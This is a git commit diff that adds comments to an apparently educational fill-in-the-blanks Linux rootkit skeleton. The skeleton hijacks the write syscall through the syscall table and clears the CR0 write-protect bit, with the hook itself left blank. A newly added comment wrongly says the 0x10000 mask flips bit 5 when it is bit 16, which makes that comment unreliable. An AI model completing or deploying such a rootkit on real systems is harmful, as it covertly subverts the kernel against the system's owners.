39f8adb07f2ce9719f54e2dc62e2446f8292f4d4
Greg Bekher <greg@bekher.net>
2016-03-03 00:44:04 -0500

    comments to myrootkit.c

--- basic/myrootkit.c
+++ basic/myrootkit.c
@@ -1,3 +1,7 @@
+/* myrootkit.c: 
+    fill in the blanks to write your first rootkit!
+*/
+
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
@@ -7,33 +11,36 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Your name here");
 
+// syscall_table perm addr in the kernel
 unsigned long *syscall_table = (unsigned long *) 0x//Address here!;
 
+// save the original write here
 asmlinkage long (*original_write)(unsigned int, const char __user *, size_t);
 
+// the hijacked write
 asmlinkage long new_write(unsigned int fd, const char __user *buf, size_t count) {
-    // hijacked write
-    
     // YOUR CODE HERE!
     // what should we return? 
 }
 
+// install the kmod
 static int init(void) {
 
-    printk(KERN_ALERT "Entering the kernel");
+    printk(KERN_ALERT "Entering the kernel\n");
 
- 	// disable write protection, flip bit 16
+ 	// disable write protection, flip bit 5
     write_cr0 (read_cr0 () & (~ 0x10000));
     
     // YOUR CODE HERE!
     // hint: you do the hook here
 
- 	// enable write protection, flip bit 16
+ 	// enable write protection, flip bit 5
     write_cr0 (read_cr0 () | 0x10000);
 
     return 0;
 }
 
+// rm the kmod
 static void exit(void) {
 
     write_cr0 (read_cr0 () & (~ 0x10000));
